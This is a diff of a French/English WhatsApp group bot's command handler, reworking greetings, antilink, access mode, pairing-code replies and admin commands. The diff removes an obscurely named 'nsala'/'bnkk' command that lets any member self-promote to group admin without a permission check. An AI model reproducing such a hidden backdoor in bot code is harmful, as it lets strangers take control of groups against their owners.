+╰━━━━━━━━━━━━━━━━━━━━╯`;
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -512,71 +512,113 @@ ${body}
 export async function handleGroupWelcome(natsu, update = {}) {
   const { id, participants = [], action } = update;
   if (!id || !String(id).endsWith('@g.us')) return;
-  if (!Array.isArray(participants) || !participants.length) return;
+  if (!participants.length) return;
 
-  const act = String(action || '').toLowerCase().trim();
-  const isJoin = ['add', 'invite', 'join'].includes(act);
-  const isLeave = ['remove', 'leave', 'kick'].includes(act);
+  // Normalize action (Baileys may emit 'add'|'remove'|'promote'|'demote'|'leave')
+  const act = String(action || '').toLowerCase();
+  const isJoin = act === 'add' || act === 'invite' || act === 'join';
+  const isLeave = act === 'remove' || act === 'leave' || act === 'kick';
   if (!isJoin && !isLeave) return;
 
   const state = getState();
-  const type = isJoin ? 'welcome' : 'goodbye';
-  const config = getGroupGreetingConfig(state, id, type);
-  if (!config.enabled) return;
+  const enabled = isJoin ? state.welcome[id] !== false : state.goodbye[id] !== false;
+  if (!enabled) return;
 
-  let groupName = 'Notre groupe';
-  let memberCount = 0;
-  try {
-    const meta = await natsu.groupMetadata(id);
-    groupName = meta?.subject || groupName;
-    memberCount = Array.isArray(meta?.participants) ? meta.participants.length : 0;
-  } catch (e) {
-    console.log(`⚠️ Group metadata unavailable for ${id}: ${e?.message || e}`);
-  }
+  let groupName = '';
+  try { groupName = (await natsu.groupMetadata(id))?.subject || ''; } catch {}
 
-  const prefix = state.prefix || PREFIX;
-
-  for (let i = 0; i < participants.length; i++) {
-    const raw = participants[i];
-    const jidP = typeof raw === 'string'
-      ? raw
-      : (raw?.id || raw?.jid || raw?.participant || '');
-
-    if (!jidP || !jidP.includes('@') || jidP.endsWith('@g.us')) continue;
-
+  for (const raw of participants) {
+    const jidP = typeof raw === 'string' ? raw : (raw?.id || raw?.jid || '');
+    if (!jidP) continue;
     const number = jidP.split('@')[0];
-    const rendered = renderGroupGreeting(config.text, {
-      user: `@${number}`,
-      group: groupName,
-      members: memberCount,
-      bot: BOT_NAME,
-      dev: DEV_NAME,
-      prefix,
-    });
-
     try {
       if (isJoin) {
         await natsu.sendMessage(id, {
           image: { url: MENU_IMAGE },
-          caption: rendered,
-          mentions: [jidP],
-          contextInfo: forwardedContext(),
-        });
-        console.log(`👋 [WELCOME] ${number} → ${groupName}`);
-      } else {
-        await natsu.sendMessage(id, {
-          text: rendered,
-          mentions: [jidP],
-          contextInfo: forwardedContext(),
-        });
-        console.log(`👋 [GOODBYE] ${number} ← ${groupName}`);
-      }
-    } catch (e) {
-      console.log(`⚠️ ${type} send failed for ${number}: ${e?.message || e}`);
-    }
+          caption:
+`╭━━━〔 *ᴡᴇʟᴄᴏᴍᴇ* 〕━━━╮
 
-    if (i < participants.length - 1) await sleep(700);
+*ʜᴇʏ @${number} !*
+*ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ${groupName || 'ᴛʜɪs ɢʀᴏᴜᴘ'}*
+
+*ᴇɴᴊᴏʏ ʏᴏᴜʀ, sᴛᴀᴛʏ ᴀɴᴅ ʜᴀᴠᴇ ғᴜɴ!*
+*ᴛʏᴘᴇ ${PREFIX}ᴍᴇɴᴜ ᴛᴏ ᴇxᴘʟᴏʀᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs.*
+
+╰━━━〔 *killua ᴍᴅ* 〕━━━╯
+> *ʏᴏᴜʀ ғᴀsᴛ ʙᴏᴛ*
+> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ : ${DEV_NAME}*`,
+          mentions: [jidP],
+          contextInfo: forwardedContext(),
+        }); 
+      } else if (isLeave) {
+        await natsu.sendMessage(id, {
+          text: `╭━━━〔 *ɢᴏᴏᴅʙʏᴇ* 〕━━━╮
+
+*ғᴀʀᴇᴡᴇʟʟ @${number}*
+
+*ᴛʜᴀɴᴋs ғᴏʀ ʙᴇɪɴɢ ᴡɪᴛʜ ᴜs.*
+*ᴡᴇ ᴡɪsʜ ʏᴏᴜ ᴛʜᴇ ʙᴇsᴛ!*
+
+╰━━━〔 *killua ᴍᴅ* 〕━━━╯
+> *ʏᴏᴜʀ ғᴀsᴛ ʙᴏᴛ*
+> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ : ${DEV_NAME}*`,
+          mentions: [jidP],
+          contextInfo: forwardedContext(),
+        });
+      }
+    } catch (e) {}
   }
+}
+
+function pIsBot(jid, meta, botIds = new Set()) {
+  if (!jid) return false;
+  if ([...botIds].some(id => sameParticipant(id, jid))) return true;
+  const p = findParticipant(meta, jid);
+  if (!p) return false;
+  return [...botIds].some(id => [p.id, p.lid, p.phoneNumber].filter(Boolean).some(pid => sameParticipant(id, pid)));
+}
+function findParticipant(meta, jid) {
+  if (!jid || !meta?.participants) return null;
+  const phone = normalizeNumber(String(jid).split('@')[0].split(':')[0]);
+  return meta.participants.find(p =>
+    p.id === jid || p.lid === jid ||
+    (phone && normalizeNumber(p.phoneNumber || String(p.id || '').split('@')[0].split(':')[0]) === phone)
+  ) || null;
+}
+
+function participantRole(meta, jid) {
+  const p = findParticipant(meta, jid);
+  if (!p) return 'member';
+  if (p.admin === 'superadmin') return 'owner';
+  if (p.admin) return 'admin';
+  return 'member';
+}
+
+function roleRank(role) {
+  return role === 'owner' ? 3 : role === 'admin' ? 2 : 1;
+}
+
+function isProtectedTarget(meta, target, state) {
+  const p = findParticipant(meta, target);
+  if (!p) return { protected: false, participant: null, role: 'member' };
+  const role = participantRole(meta, p.id);
+  const phone = normalizeNumber(p.phoneNumber || String(p.id || '').split('@')[0].split(':')[0]);
+  const owner = normalizeNumber(OWNER_NUMBER);
+  const protectedByOwner = !!phone && (phone === owner || state.sudo.includes(phone));
+  return { protected: protectedByOwner || role === 'owner', participant: p, role };
+}
+
+async function requireGroupOwnerOrCreator(natsu, jid, msg, senderJid, reply) {
+  const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+  if (!info) return null;
+  const role = participantRole(info.meta, senderJid);
+  const state = getState();
+  const creator = isOwnerOrSudo(msg, state, senderNumber(msg));
+  if (role !== 'owner' && !creator) {
+    await reply('*❌ ᴄᴇᴛᴛᴇ ᴄᴏᴍᴍᴀɴᴅᴇ ʀᴇ́sᴇʀᴠᴇ́ᴇ ᴀᴜ ᴘʀᴏᴘʀɪᴇ́ᴛᴀɪʀᴇ ᴅᴜ ɢʀᴏᴜᴘᴇ ᴏᴜ ᴀᴜ ᴏᴡɴᴇʀ ᴅᴜ ʙᴏᴛ.*');
+    return null;
+  }
+  return info;
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -588,60 +630,20 @@ export async function handleCommand(natsu, msg) {
 
   const state = getState();
   const senderJid = sender(msg);
-  const senderNum = senderJid.split('@')[0];
-  const isCreator = msg.key.fromMe || state.sudo.includes(senderNum);
+  const senderNum = senderNumber(msg);
+  const isCreator = isOwnerOrSudo(msg, state, senderNum);
 
   // Auto-react
   if (state.autoreact) {
-    try { await natsu.sendMessage(jid, { react: { text: RAND(['🐛','✨','💫','🔥','⚡','💖']), key: msg.key } }); } catch {}
+    try { await natsu.sendMessage(jid, { react: { text: RAND(['🌹','✨','💫','🔥','⚡','💖']), key: msg.key } }); } catch {}
   }
   // Auto-read
   if (state.autoread) { try { await natsu.readMessages([msg.key]); } catch {} }
+  if (state.autorecord) { try { await natsu.sendPresenceUpdate('recording', jid); setTimeout(() => natsu.sendPresenceUpdate('paused', jid).catch(() => {}), 1800); } catch {} }
+  if (state.autotyping) { try { await natsu.sendPresenceUpdate('composing', jid); } catch {} }
   // Auto view status
   if (state.autoviewsts && jid === 'status@broadcast') {
     try { await natsu.readMessages([msg.key]); } catch {}
-  }
-
-  // ── ANTISTATUT ───────────────────────────────────────────────────────────
-  // Blocks WhatsApp status mentions shared into groups when enabled.
-  // Admins are exempt. The bot must be admin to delete another member's message.
-  if (isGroup(jid) && state.antistatut[jid] && containsStatusMention(msg.message)) {
-    try {
-      const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
-      const senderIsAdmin = isGroupAdmin(admins, senderJid);
-
-      console.log(
-        `🛡️ Antistatut hit in ${jid} by ${senderNum} ` +
-        `(admin=${senderIsAdmin}, botAdmin=${botIsAdmin})`
-      );
-
-      if (!senderIsAdmin) {
-        if (botIsAdmin) {
-          try {
-            await natsu.sendMessage(jid, { delete: msg.key });
-          } catch (e) {
-            console.log(`⚠️ Antistatut delete failed: ${e?.message || e}`);
-          }
-
-          try {
-            await sendText(
-              natsu,
-              jid,
-              `🛡️ *ANTISTATUT*\n\n` +
-              `🚫 @${senderNum}, les mentions de statut sont interdites dans ce groupe.\n` +
-              `🗑️ Message supprimé.`,
-              msg
-            );
-          } catch {}
-        } else {
-          console.log(`⚠️ Antistatut active but bot is not admin in ${jid}.`);
-        }
-
-        return;
-      }
-    } catch (e) {
-      console.log(`⚠️ Antistatut check failed: ${e?.message || e}`);
-    }
   }
 
   const text = getMessageText(msg);
@@ -654,7 +656,7 @@ export async function handleCommand(natsu, msg) {
       const mins = Math.floor((Date.now() - info.since) / 60000);
       updateState(s => { delete s.afks[senderJid]; });
       await natsu.sendMessage(jid, {
-        text: `👋 Bon retour @${senderNum} ! Tu étais AFK depuis ${mins} min (${info.reason || 'aucune raison'}).`,
+        text: `👋 ʙᴏɴ ʀᴇᴛᴏᴜʀ @${senderNum} ! ᴛᴜ éᴛᴀɪs ᴀғᴋ ᴅᴇᴘᴜɪs ${mins} ᴍɪɴ (${info.reason || 'ᴀᴜᴄᴜɴᴇ ʀᴀɪsᴏɴ'}).`,
         mentions: [senderJid], contextInfo: forwardedContext(),
       }, { quoted: msg });
     }
@@ -663,7 +665,7 @@ export async function handleCommand(natsu, msg) {
       if (state.afks?.[mj]) {
         const info = state.afks[mj];
         await natsu.sendMessage(jid, {
-          text: `💤 @${mj.split('@')[0]} est AFK — *${info.reason || 'sans raison'}*`,
+          text: `*💤 @${mj.split('@')[0]} ᴇsᴛ ᴀғᴋ — *${info.reason || 'sᴀɴs ʀᴀɪsᴏɴ'}*`,
           mentions: [mj], contextInfo: forwardedContext(),
         }, { quoted: msg });
       }
@@ -674,7 +676,8 @@ export async function handleCommand(natsu, msg) {
   // si le premier mot correspond à une commande connue.
   let usedPrefix = false;
   let raw = text;
-  if (PREFIXES.includes(raw[0])) {
+  const activePrefixes = [...new Set([state.prefix || PREFIX, ...PREFIXES])];
+  if (activePrefixes.includes(raw[0])) {
     raw = raw.slice(1).trim();
     usedPrefix = true;
   }
@@ -686,19 +689,15 @@ export async function handleCommand(natsu, msg) {
     // Matches ANY URL (http/https, wa.me, t.me, chat.whatsapp.com, tiktok,
     // youtube, instagram, etc.) so it actually catches what users post.
     const LINK_RE = /(https?:\/\/\S+|www\.\S+|wa\.me\/\S+|t\.me\/\S+|chat\.whatsapp\.com\/\S+|\b[\w-]+\.(com|net|org|io|me|tv|gg|xyz|link|app|dev|co)\b\/?\S*)/i;
-    if (isGroup(jid) && state.antilink?.[jid] && LINK_RE.test(text)) {
-      const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
-      const senderIsAdmin = isGroupAdmin(admins, senderJid);
-      console.log(`🔗 Antilink hit in ${jid} by ${senderNum} (admin=${senderIsAdmin}, botAdmin=${botIsAdmin})`);
+    if (isGroup(jid) && state.antilink[jid] && LINK_RE.test(text)) {
+      const { admins, meta } = await getGroupAdmins(natsu, jid);
+      const senderIsAdmin = isGroupAdmin(admins, senderJid, meta);
       if (!senderIsAdmin) {
-        if (!botIsAdmin) return sendText(natsu, jid, '⚠️ Antilink est activé, mais je dois être administrateur pour appliquer le kick.', msg);
         try { await natsu.sendMessage(jid, { delete: msg.key }); }
-        catch (e) { console.log(`⚠️ antilink delete failed: ${e.message}`); }
+        catch (e) {}
         try { await natsu.groupParticipantsUpdate(jid, [senderJid], 'remove'); }
-        catch (e) { console.log(`⚠️ antilink kick failed: ${e.message}`); }
-        await natsu.sendMessage(jid, { text: `⛔ @${senderNum} a envoyé un lien.
-🚫 Message supprimé et membre expulsé.`, mentions: [senderJid], contextInfo: forwardedContext() }, { quoted: msg });
-        return;
+        catch (e) {}
+        return sendText(natsu, jid, `*⛔ @${senderNum} ʟɪɴᴋ ᴅᴇᴛᴇᴄᴛᴇᴅ — ᴍᴇssᴀɢᴇ ʀᴇᴍᴏᴠᴇᴅ.*`, msg);
       }
     }
     return;
@@ -711,16 +710,17 @@ export async function handleCommand(natsu, msg) {
   const arg   = parts.slice(1).join(' ');
   const args  = parts.slice(1);
 
-  // ── BOT ACCESS MODE ───────────────────────────────────────────────────────
-  // public  = everyone can use normal commands
-  // private = only owner/sudo can use commands
-  // self    = legacy alias for private
-  const botMode = String(state.mode || 'public').toLowerCase();
-  const isPrivateMode = botMode === 'private' || botMode === 'self';
-  const isOwnerOrSudo = Boolean(msg.key.fromMe) || state.sudo.includes(senderNum);
-
-  if (isPrivateMode && !isOwnerOrSudo) {
-    return;
+  // ── MODE ALWAYS PUBLIC ────────────────────────────────────────────────────
+  // The bot is PUBLIC everywhere: groups AND private chats.
+  // Everyone can use menu, fun, games, AI, downloads, etc.
+  // Only group-management commands (promote/kick/ban/etc.) keep their own
+  // admin check below — that's intentional and independent of this setting.
+  // The 'self' mode command still exists for the owner to switch, but groups
+  // are ALWAYS public regardless (self only restricts private chats).
+  if (state.mode === 'self' && !isGroup(jid)) {
+    const fromMe = msg.key.fromMe;
+    const isSudo = state.sudo.includes(senderNum);
+    if (!fromMe && !isSudo) return;
   }
   // Banned users are silently ignored
   if (state.banned.includes(senderNum)) return;
@@ -736,10 +736,15 @@ export async function handleCommand(natsu, msg) {
       // ═════════════════════════════════════════════════════════════════════
       case 'menu': case 'help': case 'list': {
         const name = msg.pushName || '';
-        const pic = RAND(MENU_IMAGES);
-        const buf = await getImageBuffer(pic);
+        let buf = null;
+        try { buf = fs.readFileSync(MENU_LOCAL_VIDEO); } catch {}
+        if (!buf) {
+          await reply(`❌ Vidéo introuvable : place *messi.mp4* dans le dossier *video* à côté de commands.js.`);
+          break;
+        }
         await natsu.sendMessage(jid, {
-          image: buf ? buf : { url: pic },
+          video: buf,
+          mimetype: 'video/mp4',
           caption: buildMenu(name),
           contextInfo: forwardedContext(),
         }, { quoted: msg });
@@ -754,454 +759,335 @@ export async function handleCommand(natsu, msg) {
         const rawNumber = (arg || '').trim();
         if (!rawNumber) {
           await reply(
-`🔗 *${BOT_NAME} — Pair a new number*
+`╭━━━〔 ${BOT_NAME} 〕━━━╮
 
-📌 *Usage:* *${PREFIX}${cmd} 243xxxxxxxx*
-   Example: *${PREFIX}${cmd} 243068570352*
+*🔗 ᴘᴀɪʀ ᴀ ɴᴇᴡ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ*
 
-▢ International format, no \`+\`, no leading \`0\`.
-▢ You will receive an 8-digit code (ABCD-1234).
-▢ Open WhatsApp → Settings → Linked Devices →
-   Link a Device → Use phone number → enter the code.
+> *📱 ᴜsᴀɢᴇ:*
+➜ *${PREFIX}${cmd} 242xxxxxxxx*
+> *ᴇxᴀᴍᴘʟᴇ:*
+➜ *${PREFIX}${cmd} 243906905464*
+━━━━━━━━━━━━━━━━━━
+> *ʀᴜʟᴇs:*
+*• ᴜsᴇ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ғᴏʀᴍᴀᴛ*
+*• ɴᴏ "+" sɪɢɴ*
+*• ɴᴏ ʟᴇᴀᴅɪɴɢ "0"*
+> *ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ:*
+> *ᴀɴ 8-ᴅɪɢɪᴛ ᴄᴏᴅᴇ*
+> *ғᴏʀᴍᴀᴛ: ᴀʙᴏᴠ-ᴇᴀʟʟ*
 
-> ${BOT_NAME} • ${DEV_NAME}`);
+> *👑 ᴘᴏᴡᴇʀᴇᴅ ʙʏ : ${DEV_NAME}*`);
           break;
         }
         const phone = rawNumber.replace(/\D/g, '');
         if (phone.length < 7 || phone.length > 15) {
-          await reply(`❌ Invalid number. Use international format without \`+\`.`);
+          await reply(`*❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ. ᴜsᴇ ɪɴᴛᴇʀɴᴀᴛɪᴏɴᴀʟ ғᴏʀᴍᴀᴛ ᴡɪᴛʜᴏᴜᴛ \`+\`."*`);
           break;
         }
         if (phone.startsWith('0')) {
-          await reply(`❌ Remove the leading 0. Ex: *${PREFIX}${cmd} 243906905464*`);
+          await reply(`*❌ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ ʟᴇᴀᴅɪɴɢ 0. ᴇx: ${PREFIX}${cmd} 243xxxx*`);
           break;
         }
-        await reply(`⏳ Generating pairing code for *+${phone}*...`);
+        await reply(`*⏳ ɢᴇɴᴇʀᴀᴛɪɴɢ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ғᴏʀ +${phone}...*`);
         try {
           const { createSession } = await import('./whatsapp.js');
           const { code } = await createSession(phone);
           if (code) {
             await reply(
-`«──────🌹─────»
-   🔑 *PAIRING CODE*
+`╭━━〔 *ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ* 〕━━╮
 
- «──────🌹─────»
+> *📱 ɴᴜᴍʙᴇʀ:*
+➜ +${phone}
+> *🔑 ᴄᴏᴅᴇ:*
+➜ ${code}
+> *⏳ ᴇxᴘɪʀᴇs:*
+➜ 2 ᴍɪɴᴜᴛᴇs
+━━━━━━━━━━━━━━━━━━
+*✅ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴡɪʟʟ ʙᴇ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ.*
 
-📞 Number: *+${phone}*
-🔢 Code: *${code}*
-⏰ Expires: *2 minutes*
-
-*Steps on the target phone:*
-WhatsApp → Settings → Linked Devices
-→ Link a Device → Use phone number
-→ Enter: *${code}*
-
-✅ Connection is automatic.
-> ${BOT_NAME} • ${DEV_NAME}`);
+╰━━〔 *killua ᴍᴅ* 〕━━╯
+> *ʏᴏᴜʀ ғᴀsᴛ ʙᴏᴛ*
+> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ : ${DEV_NAME}*`);
           } else {
-            await reply(`✅ *+${phone}* is already connected to ${BOT_NAME}!`);
+            await reply(`*✅ +${phone} ɪs ᴀʟʀᴇᴀᴅʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ${BOT_NAME}!*`);
           }
         } catch (err) {
-          await reply(`❌ Error: ${err.message}`);
+          await reply(`*❌ ᴇʀʀᴏʀ: ${err.message}*`);
         }
         break;
       }
       // ═════════════════════════════════════════════════════════════════════
       case 'ai': case 'gpt': case 'gpt4': case 'gpt5': case 'metaai':
       case 'deepseek': case 'grok-ai': case 'grok': case 'qwen': case 'gemini': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}${cmd} <prompt>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}${cmd} <𝗽𝗿𝗼𝗺𝗽𝘁>*`); break; }
         const ans = await askAI(arg, cmd);
-        await reply(`🤖 *${cmd.toUpperCase()}*\n\n${ans}`);
+        await reply(`🐐 *${cmd.toUpperCase()}*\n\n${ans}`);
         break;
-      }
+       } 
       case 'codeai': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}codeai <task>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}codeai <𝘁𝗮𝘀𝗸>*`); break; }
         const ans = await askAI(`You are a senior software engineer. Write clean code for: ${arg}`, 'codeai');
-        await reply(`💻 *CODE AI*\n\n${ans}`);
+        await reply(`💻 *𝗖𝗢𝗗𝗘 𝗔𝗜*\n\n${ans}`);
         break;
       }
       case 'photoai': {
         if (!arg) { await reply(`❌ Usage: *${PREFIX}photoai <description>*`); break; }
         const url = `https://image.pollinations.ai/prompt/${encodeURIComponent(arg)}?width=768&height=768&nologo=true`;
-        await img(url, `🎨 *PHOTO AI*\n📝 ${arg}`);
+        await img(url, `🎨 *𝗣𝗛𝗢𝗧𝗢 𝗔𝗜*\n📝 ${arg}`);
         break;
       }
       case 'storyai': {
-        if (!arg) { await reply(`❌ Usage: *${PREFIX}storyai <theme>*`); break; }
+        if (!arg) { await reply(`❌ 𝗨𝘀𝗮𝗴𝗲: *${PREFIX}storyai <𝘁𝗵𝗲𝗺𝗲>*`); break; }
         const ans = await askAI(`Write a short engaging story (~300 words) about: ${arg}`, 'story');
-        await reply(`📖 *STORY AI*\n\n${ans}`);
+        await reply(`📖 *𝗦𝗧𝗢𝗥𝗬 𝗔𝗜*\n\n${ans}`);
         break;
       }
       case 'triviaai': {
         const ans = await askAI('Give me one interesting trivia question with the answer in parentheses.', 'trivia');
-        await reply(`🧠 *TRIVIA AI*\n\n${ans}`);
+        await reply(`🧠 *𝗧𝗥𝗜𝗩𝗜𝗔 𝗔𝗜*\n\n${ans}`);
         break;
       }
 
       // ═════════════════════════════════════════════════════════════════════
       // GROUP MENU
       // ═════════════════════════════════════════════════════════════════════
-      case 'nsala':
-case 'bnkk': {
-if (!isGroup(jid)) {
-await reply('❌ Cette commande nest disponible que dans les groupes.');
-break;
-}
-
-// Récupérer les infos du groupe et vérifier si le bot est admin
-const { admins, botIsAdmin } = await getGroupAdmins(natsu, jid);
-
-if (!botIsAdmin) {
-    await reply('❌ Le bot nest pas administrateur dans ce groupe.');
-    break;
-}
-
-// Vérifier si l'utilisateur est déjà admin
-if (isGroupAdmin(admins, senderJid)) {
-    await reply(
-        `✅ Tu es déjà administrateur, @${senderNum} !`,
-        { mentions: [senderJid] }
-    );
-    break;
-}
-
-// Promouvoir automatiquement l'utilisateur qui exécute la commande
-try {
-    await natsu.groupParticipantsUpdate(
-        jid,
-        [senderJid],
-        'promote'
-    );
-
-    // Message de confirmation
-    const promoMsg =
-        `👑 *AUTO PROMOTION*\n\n` +
-        `👤 Utilisateur : @${senderNum}\n` +
-        `📅 Date : ${new Date().toLocaleString()}\n\n` +
-        `✨ Tu es maintenant administrateur de ce groupe !`;
-
-    await natsu.sendMessage(
-        jid,
-        {
-            text: promoMsg,
-            mentions: [senderJid],
-            contextInfo: forwardedContext(),
-        },
-        { quoted: msg }
-    );
-
-} catch (error) {
-    console.error('Erreur dans autoadmi:', error);
-
-    await reply(
-        `❌ Échec de la promotion : ${error.message || 'erreur inconnue'}`
-    );
-}
-
-break;
-
-}
-      case 'tagall': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
+      case 'welcome': case 'goodbye': {
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        const key = cmd === 'welcome' ? 'welcome' : 'goodbye';
+        if (!arg) { await reply(`📌 *${cmd}* → ${getState()[key][jid] === false ? 'OFF' : 'ON'}\nUsage: ${PREFIX}${cmd} on/off`); break; }
+        const on = /^(on|1|true)$/i.test(arg.trim());
+        updateState(st => { st[key][jid] = on; });
+        await reply(`✅ *${cmd}* → ${on ? 'ON' : 'OFF'}`);
+        break;
+      }
+      case 'admins': case 'groupadmins': {
+        if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); break; }
         const { meta } = await getGroupAdmins(natsu, jid);
+        if (!meta) { await reply('*❌ ɪᴍᴘᴏssɪʙʟᴇ ᴅᴇ ʟɪʀᴇ ʟᴇ ɢʀᴏᴜᴘᴇ.*'); break; }
+        const admins = meta.participants.filter(p => p.admin);
+        const mentions = admins.map(p => p.id);
+        const text = `👑 *ADMINS — ${meta.subject}*\n\n${admins.map((p,i) => `◈ ${i+1}. @${p.id.split('@')[0]} ${p.admin === 'superadmin' ? '👑' : '⭐'}`).join('\n')}`;
+        await natsu.sendMessage(jid, { text, mentions, contextInfo: forwardedContext() }, { quoted: msg });
+        break;
+      }
+      case 'rules': {
+        if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); break; }
+        const rules = getState().rules?.[jid] || 'Aucune règle définie. Les admins peuvent utiliser .setrules <règles>.';
+        await reply(`📜 *RÈGLES DU GROUPE*\n\n${rules}`);
+        break;
+      }
+      case 'setrules': {
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        if (!arg) { await reply(`❌ Usage: ${PREFIX}setrules <texte>`); break; }
+        updateState(s => { s.rules ??= {}; s.rules[jid] = arg.slice(0, 5000); });
+        await reply('✅ *Règles du groupe mises à jour.*');
+        break;
+      }
+      case 'poll': {
+        if (!isGroup(jid)) { await reply('*❌ ɢʀᴏᴜᴘ ᴏɴʟʏ.*'); break; }
+        const pieces = arg.split('|').map(x => x.trim()).filter(Boolean);
+        if (pieces.length < 3) { await reply(`❌ Usage: ${PREFIX}poll Question | Option 1 | Option 2`); break; }
+        const [question, ...values] = pieces.slice(0, 13);
+        try { await natsu.sendMessage(jid, { poll: { name: question, values, selectableCount: 1 } }, { quoted: msg }); }
+        catch (e) { await reply(`❌ Poll : ${e.message}`); }
+        break;
+      }
+      case 'groupinfo': case 'ginfo': case 'groupid': case 'groupname': {
+        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
+        const meta = await natsu.groupMetadata(jid);
+        if (cmd === 'groupid') { await reply(`🆔 *GROUP ID*\n\n${jid}`); break; }
+        if (cmd === 'groupname') { await reply(`📛 *GROUP NAME*\n\n${meta.subject}`); break; }
+        const admins = meta.participants.filter(p => p.admin).length;
+        await reply(`👥 *GROUP INFO*\n\n📛 ${meta.subject}\n👤 Members: ${meta.participants.length}\n👑 Admins: ${admins}\n🆔 ${jid}`);
+        break;
+      }
+      case 'members': case 'membercount': {
+        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
+        const meta = await natsu.groupMetadata(jid);
+        await reply(`👥 *${meta.subject}*\nMembers: *${meta.participants.length}*`);
+        break;
+      }
+      case 'myrole': {
+        const info = await requireGroupMember(natsu, jid, reply);
+        if (!info) break;
+        const role = participantRole(info.meta, senderJid);
+        const label = role === 'owner' ? '👑 Group owner' : role === 'admin' ? '🛡️ Admin' : '👤 Member';
+        await reply(`🎖️ *YOUR ROLE*\n\n${label}`);
+        break;
+      }
+      case 'memberinfo': {
+        const info = await requireGroupMember(natsu, jid, reply);
+        if (!info) break;
+        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+        const target = mentioned[0] || msg.message?.extendedTextMessage?.contextInfo?.participant;
+        if (!target) { await reply(`❌ Usage: ${PREFIX}memberinfo @user`); break; }
+        const found = findParticipant(info.meta, target);
+        if (!found) { await reply('❌ Member not found in this group.'); break; }
+        const role = participantRole(info.meta, found.id);
+        const label = role === 'owner' ? '👑 Group owner' : role === 'admin' ? '🛡️ Admin' : '👤 Member';
+        await natsu.sendMessage(jid, { text: `👤 *MEMBER INFO*\n\n@${found.id.split('@')[0]}\n🎖️ ${label}`, mentions: [found.id], contextInfo: forwardedContext() }, { quoted: msg });
+        break;
+      }
+      case 'botstatus': case 'status': {
+        const up = Math.floor(process.uptime());
+        const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60), sec = up % 60;
+        await reply(`🤖 *${BOT_NAME}*\n🟢 Online\n⏱️ ${h}h ${m}m ${sec}s\n📦 Node ${process.version}`);
+        break;
+      }
+      case 'tagall': {
+        // TAGALL only reads group metadata and sends mentions; the bot does not
+        // need to be a group admin for this command.
+        const info = await requireGroupMember(natsu, jid, reply);
+        if (!info) break;
+        const { meta } = info;
         if (!meta) break;
         const mentions = meta.participants.map(p => p.id);
-        const txt = `📢 *TAG ALL* — ${arg || 'hey!'}\n\n` +
-          mentions.map((m, i) => `${i + 1}. @${m.split('@')[0]}`).join('\n');
+        const txt = `*📢 ᴛᴀɢᴀʟʟ — ${arg || 'ʜᴇʟʟᴏ ᴀʟʟ ᴍᴇᴍʙᴇʀs😻!*'}\n\n` +
+          mentions.map((m, i) => `├🔖${i + 1}. @${m.split('@')[0]}`).join('\n');
         await natsu.sendMessage(jid, { text: txt, mentions, contextInfo: forwardedContext() }, { quoted: msg });
         break;
       }
       case 'hidetag': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        const { meta } = await getGroupAdmins(natsu, jid);
+        // HIDETAG only reads group metadata and sends mentions; no bot-admin
+        // permission is required here.
+        const info = await requireGroupMember(natsu, jid, reply);
+        if (!info) break;
+        const { meta } = info;
         if (!meta) break;
         await natsu.sendMessage(jid, {
-          text: arg || '📢',
+          text: arg || '▢',
           mentions: meta.participants.map(p => p.id),
           contextInfo: forwardedContext(),
         });
         break;
       }
       case 'promote': case 'demote': case 'kick': case 'add': {
-        if (!isGroup(jid)) { await reply('❌ Group only.'); break; }
-        const { admins } = await getGroupAdmins(natsu, jid);
-        // Only check that the sender is a group admin (no more "bot must be admin").
-        if (!isGroupAdmin(admins, senderJid) && !msg.key.fromMe) {
-          await reply('❌ Admins only.'); break;
+        const info = await requireGroupAdmin(natsu, jid, msg, senderJid, reply);
+        if (!info) break;
+        const { meta } = info;
+        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
+        const mention = mentioned[0];
+        const numArg = normalizeNumber(arg);
+        let target = mention || (numArg ? `${numArg}@s.whatsapp.net` : null);
+        if (!target) { await reply(`*❌ ᴜsᴀɢᴇ: ${PREFIX}${cmd} @ᴜsᴇʀ ᴏᴜ ${PREFIX}${cmd} 243xxxxxxxxx*`); break; }
+
+        // Resolve LID/phone to the exact participant JID whenever possible.
+        const found = findParticipant(meta, target);
+        if (found?.id) target = found.id;
+
+        const stateNow = getState();
+        const senderRole = participantRole(meta, senderJid);
+        const targetInfo = isProtectedTarget(meta, target, stateNow);
